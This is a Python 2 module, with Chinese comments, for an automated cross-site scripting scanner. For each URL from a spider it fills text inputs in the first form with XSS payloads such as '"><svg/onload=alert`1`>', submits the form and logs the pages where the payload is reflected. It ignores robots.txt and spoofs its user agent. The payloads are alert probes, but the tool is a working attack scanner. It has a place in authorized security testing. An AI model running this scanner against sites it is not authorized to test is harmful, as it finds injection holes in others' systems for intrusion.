#!/usr/bin/env python
#coding=utf-8
import mechanize

'''
接受Spider模块解析出的所有url，返回插入每个的结果
'''
#攻击载荷
'''
payloads = ['<svg "ons>', '" onfocus="alert(1);', 'javascript:alert(1)', '"><svg/onload=alert`1`>']

blacklist = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.avi', '.gif', '.svg',
             '.pdf']
xssLinks = [] 
'''
#"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
class xss():
    '攻击器的属性就是攻击参数，同时排除干扰目标,拿到攻击目标'
    #初始化模拟器
    def __init__(self, payloads, blacklist, urllist):
        self.payloads = payloads
        self.blacklist = blacklist
        self.urllist = urllist
        self.xssLinks = ''

        br = mechanize.Browser()
        br.addheaders = [
            ('User-agent',
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')
        ]
        br.set_handle_robots(False)
        br.set_handle_refresh(False)

        self.br = br

    def _testPayload(self,payload, p, link):
        
        self.br.form[str(p.name)] = payload
        self.br.submit()
        # if payload is found in response, we have XSS
        if payload in self.br.response().read():
            #print ('xss found!')
            report = 'Link: %s, Payload: %s, Element: %s' % (str(link),
                                                            payload, str(p.name))
            #print 'report:  '+report
            self.xssLinks.append(report)
        
        self.br.back()
    
    def findxss(self):
        self.xssLinks = []

        for link in self.urllist:
            blacklisted = False
            y = str(link)
            
            for ext in self.blacklist:
                if ext in y:
                    
                    blacklisted = True
                    break
            if not blacklisted:
                try:
                    self.br.open(str(link))    # open the link
                    if self.br.forms():        # if a form exists, submit it
                        params = list(self.br.forms())[0]    # our form
                        self.br.select_form(nr=0)    # submit the first form
                        for p in params.controls:
                            par = str(p)
                            # submit only those forms which require text
                            if 'TextControl' in par:
                                
                                for item in self.payloads:
                                    self._testPayload(item, p, link)
        
                except:
                    pass
        
        #for link in xssLinks:        # print all xss findings
        #    pass
        return self.xssLinks

